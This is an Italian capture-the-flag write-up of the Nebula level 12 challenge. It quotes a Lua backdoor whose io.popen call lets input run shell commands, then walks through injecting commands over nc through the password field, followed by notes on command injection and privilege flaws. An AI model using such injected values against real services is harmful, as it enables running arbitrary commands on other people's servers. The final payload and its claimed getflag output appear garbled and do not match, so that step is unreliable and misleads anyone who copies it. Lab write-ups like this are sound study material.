# Nebula-12

## Traccia

> There is a backdoor process listening on port 50001.
> 
> 
> To do this level, log in as the **level12** account with the password **level12**. Files for this level can be found in /home/flag12.
> 
> ### Codice Sorgente
> 
> ```lua
> local socket = require("socket")
> local server = assert(socket.bind("127.0.0.1", 50001))
> 
> function hash(password)
>   prog = io.popen("echo "..password.." | sha1sum", "r")
>   data = prog:read("*all")
>   prog:close()
> 
>   data = string.sub(data, 1, 40)
> 
>   return data
> end
> 
> while 1 do
>   local client = server:accept()
>   client:send("Password: ")
>   client:settimeout(60)
>   local line, err = client:receive()
>   if not err then
>       print("trying " .. line) -- log from where ;\
>       local h = hash(line)
> 
>       if h ~= "4754a4f4bd5787accd33de887b9250a0691dd198" then
>           client:send("Better luck next time\n");
>       else
>           client:send("Congrats, your token is 413**CARRIER LOST**\n")
>       end
> 
>   end
> 
>   client:close()
> end
> ```
> 

## SVOLGIMENTO

1. Conoscere il codice:
    1. Codice scritto in un linguaggio di programmazione leggero chiamato Lua, utilizzato come linguaggio di scripting di uso generico (es. MOD GTA, MOD Minecraft)
    2. Si tratta di un processo che rimane in ascolto sulla porta 50001
    3. Lo scopo del codice è quello di ricevere un input, crearne l’hash e confrontarlo con un determinato hash. 
    4. Questa linea è un pò particolare (linea 5):
        
        ```lua
        prog = io.popen("echo "..password.." | sha1sum", "r")
        ```
        
        La funzione io.popen permette di eseguire comandi di sistemi, e quei due punti prima e dopo la variabile password rappresentano l’operatore di concatenazione. 
        
        Quindi, la mia mente maligna, mi fa pensare che posso scrivere ciò che voglio nella variabile password visto che non ci sono controlli. Volendo essendo comandi di sistema possiamo concatenarli con un ; e eseguire più comandi come succede nella sfida CTF (non ricordo il numero).
        
        Facciamo una prima prova:
        
        ```bash
        level12@nebula:/home/flag12$ nc localhost 50001 #per effettuare la connessione al websocket
        ```
        
        Ora ci troveremo `Password:` . Proviamo ad inserire questo comando per farci stampare il nome di chi esegue il comando.
        
        ```bash
        	Password: $(whoami) > /tmp/teamCPV/prova1
        ```
        
        Il risultato è: `flag12` . Quindi possiamo vedere che abbiamo eseguito codice esterno dentro la funzione hash. 
        
        Come fatto prima proviamo ad eseguire getflag, in modo tale da prendere la bandiera.
        
        ```bash
        level12@nebula:/home/flag12$ nc localhost 50001
        	Password: r;mkdir /tmp/teamCPV;R/tmp/teamCPV/flag12.txt;4
        	Better luck next time
        
        level12@nebula:/home/flag12$ cat /tmp/team
        	You have successfully executed getflag on a target account
        	# VINTO :)
        ```
        

## Vulnerabilità

<aside>
🔥 OS COMMAND INJECTION

OS command injection flaws (CWE-78) allow attackers to run arbitrary
commands on the remote server. Because a command injection vulnerability may lead to compromise of the server hosting the web application, it is often considered a very serious flaw. In Lua, this kind of vulnerability occurs, for example, when a developer uses unvalidated user data to run operating system commands via the os.execute() or io.popen() Lua functions.

</aside>

<aside>
💡 Argument Injection / Modification

L'Argument Injection/Modification è una tecnica di attacco informatico in cui un attaccante modifica o inietta dati dannosi in un'applicazione attraverso l'utilizzo di input utente non validati o controllati. Questi dati possono essere utilizzati per modificare il comportamento dell'applicazione o per ottenere accesso non autorizzato a risorse o informazioni sensibili.

L'Argument Injection/Modification può essere utilizzata in diversi contesti, come ad esempio in applicazioni web che utilizzano parametri di query o form per elaborare le richieste degli utenti. In questo caso, un attaccante potrebbe modificare i parametri di input per eseguire codice dannoso sul server o per accedere a dati riservati.

Per prevenire l'Argument Injection/Modification, è importante validare e controllare tutti gli input utente in modo che siano conformi alle aspettative dell'applicazione. Ciò può essere fatto attraverso l'utilizzo di filtri di input, la limitazione dei caratteri consentiti e l'uso di metodi di crittografia per proteggere i dati sensibili. Inoltre, è importante mantenere l'applicazione aggiornata con le ultime patch di sicurezza per mitigare eventuali vulnerabilità note.

</aside>

<aside>
👾 Execution with Unnecessary privileges

La vulnerabilità Execution with Unnecessary privileges (esecuzione con privilegi non necessari) si verifica quando un'applicazione o un processo viene eseguito con privilegi più elevati di quelli necessari per svolgere le sue funzioni. Questo può consentire a un attaccante di sfruttare l'applicazione o il processo per eseguire codice dannoso o accedere a risorse o informazioni sensibili.

Un esempio comune di questa vulnerabilità è quando un'applicazione viene eseguita con privilegi di amministratore o root, anche se non è necessario per svolgere le sue funzioni. Ciò può consentire a un attaccante di sfruttare l'applicazione per eseguire codice dannoso con i privilegi elevati dell'amministratore o del root, il che potrebbe consentire all'attaccante di compromettere il sistema.

Per prevenire la vulnerabilità Execution with Unnecessary privileges, è importante limitare i privilegi di esecuzione dell'applicazione o del processo solo a quelli necessari per svolgere le sue funzioni. Ciò può essere fatto attraverso l'implementazione di una politica di sicurezza che limita l'accesso ai privilegi di amministratore o root solo ai casi in cui sono strettamente necessari. Inoltre, è importante monitorare costantemente l'uso dei privilegi dell'applicazione o del processo per rilevare eventuali anomalie o attività sospette.

</aside>
